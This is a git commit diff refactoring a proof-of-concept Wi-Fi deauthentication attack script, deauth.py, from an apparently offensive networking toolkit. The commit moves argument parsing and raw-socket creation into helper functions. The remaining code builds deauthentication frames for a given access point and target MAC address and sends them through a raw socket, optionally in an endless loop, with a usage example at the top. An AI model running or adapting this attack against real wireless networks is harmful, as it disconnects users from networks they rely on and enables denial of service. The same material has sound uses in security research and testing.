9a9e434256e2502d899b5e642b8dcb01f2a88328
Claudjos <claudjosmail@gmail.com>
2022-04-25 16:04:25 +0200

    agv.poc.deauth: removed redundant code.

--- agv/poc/wifi/deauth.py
+++ agv/poc/wifi/deauth.py
@@ -16,42 +16,21 @@ Examples:
 	python3 -m agv.poc.wifi.deauth dd:aa:11:bb:ee:cc 00:aa:11:bb:22:cc mon0
 
 """
-import socket, time, sys
+import time, sys
 from agave.core.ethernet import MACAddress
 from agave.core.buffer import Buffer
 from agave.core.wifi.radiotap import RadioTapHeader
 from agave.core.wifi.mac import Deauthentication
 from agave.utils.interfaces import NetworkInterfaceNotFound
-from agv.blocks.wifi import ServiceSetNotFound, get_service_set_address
-
-
-def read_mac(x: str) -> MACAddress:
-	try:
-		return MACAddress(x)
-	except ValueError:
-		print("Invalid MAC Address {}".format(x))
-		exit(0)
-
-
-def read_bssid(x: str, i: str) -> MACAddress:
-	try:
-		return MACAddress(x)
-	except ValueError:
-		try:
-			return get_service_set_address(x, i)
-		except ServiceSetNotFound:
-			print("Couldn't find a SS {}".format(x))
-			exit(0)
-		except NetworkInterfaceNotFound as e:
-			print(e)
-			exit(0)
+from agv.blocks.wifi import ServiceSetNotFound, get_service_set_address, create_socket
+from agv.misc import read_interface_or_die, read_bssid_or_die, read_mac_or_die
 
 
 if __name__ == "__main__":
 	# Parse arguments
-	interface = sys.argv[3]
-	bssid = read_bssid(sys.argv[1], interface)
-	target = read_mac(sys.argv[2])
+	interface = read_interface_or_die(sys.argv[3])
+	bssid = read_bssid_or_die(sys.argv[1], interface)
+	target = read_mac_or_die(sys.argv[2])
 	repeat = float(sys.argv[4]) if len(sys.argv) > 4 else None
 	# Build frames
 	radiotap = RadioTapHeader.build()
@@ -63,14 +42,14 @@ if __name__ == "__main__":
 	wifi.write_to_buffer(buf)
 	packet = bytes(buf)
 	# Send
-	sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+	sock = create_socket(interface.name)
 	if repeat is None:
-		sock.sendto(packet, (interface, 0))
+		sock.sendto(packet, (interface.name, 0))
 	else:
 		try:
 			print(f"Loop interval: {repeat}s\nOn going...")
 			while True:
-				sock.sendto(packet, (interface, 0))
+				sock.sendto(packet, (interface.name, 0))
 				time.sleep(repeat)
 		except KeyboardInterrupt:
 			pass
